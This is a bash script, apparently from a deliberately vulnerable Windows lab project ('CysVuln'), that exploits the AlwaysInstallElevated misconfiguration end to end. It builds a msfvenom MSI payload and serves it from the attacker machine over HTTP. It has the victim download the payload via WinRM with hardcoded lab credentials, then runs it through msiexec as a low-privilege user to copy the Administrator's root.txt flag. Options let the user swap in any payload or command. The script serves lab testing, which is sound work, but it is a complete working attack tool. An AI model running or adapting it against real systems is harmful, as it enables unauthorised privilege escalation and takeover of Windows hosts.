#!/usr/bin/env bash
set -uo pipefail

# Build a real msfvenom MSI on the attacker, stage it on the CysVuln VM,
# and trigger it as an interactive User_Joe session to validate the
# AlwaysInstallElevated finding end-to-end (player-tool equivalent of
# scripts/validate/check_aie_response.py).
#
# Usage:
#   nix develop .#kali
#   ./scripts/run-msfvenom-aie.sh [target-ip]
#
# Env knobs (mirrors run-sharpup.sh where it makes sense):
#   WINRM_PORT       WinRM port on the target (default 15985)
#   ADMIN_PW         Administrator password (default PizzaMan123!)
#   JOE_USER         Account msiexec runs as (default User_Joe)
#   JOE_PW           JOE_USER password (default VeryStrongPassword123!@#)
#   RDP_PORT         RDP port for the interactive bootstrap (default 13389)
#   MSF_PAYLOAD      msfvenom -p value (default windows/exec)
#   MSF_CMD          CMD= value (default: copy root.txt -> aie-msfvenom-flag.txt)
#   MSF_EXITFUNC     EXITFUNC= value (default thread)
#   MSF_LOCAL        Local MSI output path (default /tmp/aie-msfvenom-<ts>.msi)
#   MSF_MSI_VICTIM_PATH   Victim MSI install path
#                         (default C:\Users\Public\aie-msfvenom-payload.msi)
#   MSF_FLAG_VICTIM_PATH  Victim path the CMD payload writes
#                         (default C:\Users\Public\aie-msfvenom-flag.txt)
#   MSF_LOG_VICTIM_PATH   Victim msiexec /l*v log path
#                         (default C:\Users\Public\aie-msfvenom-joe.log)
#   MSF_HOST_FROM_GUEST   Guest -> attacker gateway (default 10.0.2.2)
#   MSF_SERVE_PORT        Local HTTP staging port (default 0 = OS-picked free port)
#   MSF_KEEP              If 1, leave the MSI + flag on the victim
#   MSF_LOG               Override attacker-side log path
#   MSF_POLL_TIMEOUT      Seconds to wait for the flag drop (default 120)

TARGET="${1:-127.0.0.1}"
WINRM_PORT="${WINRM_PORT:-15985}"
ADMIN_PW="${ADMIN_PW:-PizzaMan123!}"
JOE_USER="${JOE_USER:-User_Joe}"
JOE_PW="${JOE_PW:-VeryStrongPassword123!@#}"
RDP_PORT="${RDP_PORT:-13389}"
MSF_PAYLOAD="${MSF_PAYLOAD:-windows/exec}"
MSF_CMD="${MSF_CMD:-cmd /c copy C:\\Users\\Administrator\\Desktop\\root.txt C:\\Users\\Public\\aie-msfvenom-flag.txt}"
MSF_EXITFUNC="${MSF_EXITFUNC:-thread}"
TS="$(date -u +%Y%m%d-%H%M%S)"
MSF_LOCAL="${MSF_LOCAL:-/tmp/aie-msfvenom-${TS}.msi}"
MSF_MSI_VICTIM_PATH="${MSF_MSI_VICTIM_PATH:-C:\\Users\\Public\\aie-msfvenom-payload.msi}"
MSF_FLAG_VICTIM_PATH="${MSF_FLAG_VICTIM_PATH:-C:\\Users\\Public\\aie-msfvenom-flag.txt}"
MSF_LOG_VICTIM_PATH="${MSF_LOG_VICTIM_PATH:-C:\\Users\\Public\\aie-msfvenom-joe.log}"
MSF_HOST_FROM_GUEST="${MSF_HOST_FROM_GUEST:-10.0.2.2}"
MSF_SERVE_PORT="${MSF_SERVE_PORT:-0}"
MSF_POLL_TIMEOUT="${MSF_POLL_TIMEOUT:-120}"
LOG="${MSF_LOG:-artifacts/cysvuln/msfvenom-aie-${TS}.log}"

mkdir -p "$(dirname "$LOG")"
exec > >(tee -a "$LOG") 2>&1
echo "[*] msfvenom AIE log: $LOG"
echo "[*] started: $(date -Is)"

if ! command -v msfvenom >/dev/null 2>&1; then
    echo "[!] msfvenom missing; run: nix develop .#kali" >&2
    exit 2
fi
if ! python3 -c "import winrm" 2>/dev/null; then
    echo "[!] pywinrm missing; run: nix develop (.#kali includes the default shell)" >&2
    exit 2
fi

echo "[*] building MSI: payload=${MSF_PAYLOAD} exitfunc=${MSF_EXITFUNC}"
echo "    CMD: ${MSF_CMD}"
if ! msfvenom -p "$MSF_PAYLOAD" CMD="$MSF_CMD" EXITFUNC="$MSF_EXITFUNC" \
        -f msi -o "$MSF_LOCAL"; then
    echo "[!] msfvenom build failed" >&2
    exit 3
fi
echo "[*] built $MSF_LOCAL ($(wc -c < "$MSF_LOCAL") bytes, sha256=$(sha256sum "$MSF_LOCAL" | awk '{print $1}'))"

# Stage on victim via a temp HTTP server using the same QEMU host-from-guest
# pattern as scripts/validate-cysvuln-chain.sh.
STAGE_DIR="$(mktemp -d /tmp/msf-stage.XXXXXX)"
cp "$MSF_LOCAL" "$STAGE_DIR/aie-msfvenom-payload.msi"
trap 'rm -rf "$STAGE_DIR"' EXIT

STAGE_RC=0
export MSF_STAGE_DIR="$STAGE_DIR"
export MSF_SERVE_PORT MSF_HOST_FROM_GUEST TARGET WINRM_PORT ADMIN_PW MSF_MSI_VICTIM_PATH
python3 - <<'PY' || STAGE_RC=$?
import functools, http.server, os, sys, threading, winrm

stage = os.environ["MSF_STAGE_DIR"]
serve_port = int(os.environ["MSF_SERVE_PORT"])
host_from_guest = os.environ["MSF_HOST_FROM_GUEST"]
target = os.environ["TARGET"]
winrm_port = os.environ["WINRM_PORT"]
admin_pw = os.environ["ADMIN_PW"]
msi_victim = os.environ["MSF_MSI_VICTIM_PATH"]

class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        return

handler = functools.partial(Quiet, directory=stage)
server = http.server.ThreadingHTTPServer(("0.0.0.0", serve_port), handler)
port = server.server_address[1]
threading.Thread(target=server.serve_forever, daemon=True).start()
print(f"[*] HTTP staging on :{port}; guest pulls from {host_from_guest}", flush=True)

session = winrm.Session(
    f"http://{target}:{winrm_port}/wsman",
    auth=("Administrator", admin_pw),
    transport="ntlm",
    operation_timeout_sec=120,
    read_timeout_sec=130,
)
ps = (
    "$ErrorActionPreference='Stop';"
    f"Remove-Item '{msi_victim}' -Force -EA SilentlyContinue;"
    f"Invoke-WebRequest -Uri 'http://{host_from_guest}:{port}/aie-msfvenom-payload.msi' "
    f"-OutFile '{msi_victim}' -UseBasicParsing;"
    f"$h = (Get-FileHash -Algorithm SHA256 -Path '{msi_victim}').Hash.ToLower();"
    f"Write-Host \"[victim] staged {msi_victim} sha256=$h\""
)
r = session.run_ps(ps)
sys.stdout.write(r.std_out.decode(errors="replace"))
sys.stderr.write(r.std_err.decode(errors="replace"))
server.shutdown()
server.server_close()
sys.exit(r.status_code)
PY

if [ "$STAGE_RC" -ne 0 ]; then
    echo "[!] MSI staging failed (rc=$STAGE_RC)" >&2
    exit 4
fi

echo
echo "[*] triggering msiexec via interactive User_Joe (PsExec/RDP)"
python3 scripts/validate/run_aie_as_joe_interactive.py \
    --target "$TARGET" --winrm-port "$WINRM_PORT" --rdp-port "$RDP_PORT" \
    --admin-password "$ADMIN_PW" --joe-password "$JOE_PW" \
    --msi-path "$MSF_MSI_VICTIM_PATH" \
    --flag-path "$MSF_FLAG_VICTIM_PATH" \
    --log-path "$MSF_LOG_VICTIM_PATH" \
    --poll-timeout "$MSF_POLL_TIMEOUT"
RC=$?

if [ "${MSF_KEEP:-0}" != "1" ]; then
    echo "[*] cleaning up victim artifacts"
    export MSF_FLAG_VICTIM_PATH MSF_LOG_VICTIM_PATH
    python3 - <<'PY'
import os, winrm
s = winrm.Session(
    f"http://{os.environ['TARGET']}:{os.environ['WINRM_PORT']}/wsman",
    auth=("Administrator", os.environ["ADMIN_PW"]),
    transport="ntlm",
)
paths = [
    os.environ["MSF_MSI_VICTIM_PATH"],
    os.environ["MSF_FLAG_VICTIM_PATH"],
    os.environ["MSF_LOG_VICTIM_PATH"],
]
joined = ",".join(f"'{p}'" for p in paths)
s.run_ps(f"Remove-Item {joined} -Force -EA SilentlyContinue")
PY
else
    echo "[*] keeping victim artifacts:"
    echo "    ${MSF_MSI_VICTIM_PATH}"
    echo "    ${MSF_FLAG_VICTIM_PATH}"
    echo "    ${MSF_LOG_VICTIM_PATH}"
fi

echo
echo "===== run-msfvenom-aie ====="
echo "  exit code: $RC"
echo "  finished:  $(date -Is)"
echo "  attacker MSI: $MSF_LOCAL"
echo "  log:          $LOG"
echo "============================"
exit "$RC"
